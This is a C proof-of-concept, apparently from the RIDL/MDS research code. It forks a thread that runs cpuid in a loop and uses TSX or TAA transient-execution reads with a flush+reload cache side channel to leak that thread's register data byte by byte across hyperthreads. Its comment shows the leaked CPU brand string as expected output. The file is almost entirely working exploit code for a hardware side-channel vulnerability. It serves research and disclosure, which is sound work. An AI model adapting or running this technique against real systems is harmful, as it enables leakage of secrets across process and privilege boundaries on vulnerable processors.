/*
Run cpuid on one thread, and then leak the results on another.

Notes:
 * run with -DDETAILS for byte values; use different values of CPUID_LEAF for different data

Expected output:

$ taskset -c 3,7 ./cpuid_leak 
Intel(R) Core(TM???????????????????????>?????????Z???Z?)???r?&??
*/
#ifdef TAA
 #define ITERS 100
#else
 #define ITERS 2000 /* change to 10k for more reliable leak */
#endif

#include "ridl.h"

#define CPUID_LEAF 0x80000002

int main(int argc, char *argv[]) {
	/* Fork child which runs cpuid in a loop. */
	pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"mov %0, %%eax\n"
				"cpuid\n"
				::"r"(CPUID_LEAF):"eax","ebx","ecx","edx");
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();
#ifndef TAA
	leak = mmap((void *)0xc0000000, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
#endif

	for (size_t offset = 0; offset < 64; ++offset) {
		memset(results, 0, sizeof(results));

		madvise(leak, 4096, MADV_DONTNEED);
		for (size_t i = 0; i < ITERS; ++i) {
			flush(reloadbuffer);
#ifdef TAA
			tsxabort_leak_clflush(leak + offset, reloadbuffer, reloadbuffer);
#else
			asm volatile("mfence\n");
			tsx_leak_read_normal(leak + offset, reloadbuffer);
#endif
			reload(reloadbuffer, results);
		}

#ifdef DETAILS
		print_results(results);
		printf("--\n");
#else
		size_t max = 0x1;
		for (size_t c = 1; c < 256; ++c) {
			if (results[c] >= results[max])
				max = c;
		}
		printf("%c", isprint(max) ? (int)max : '?');
#endif
	}

	printf("\n");
	kill(pid, SIGKILL);
}

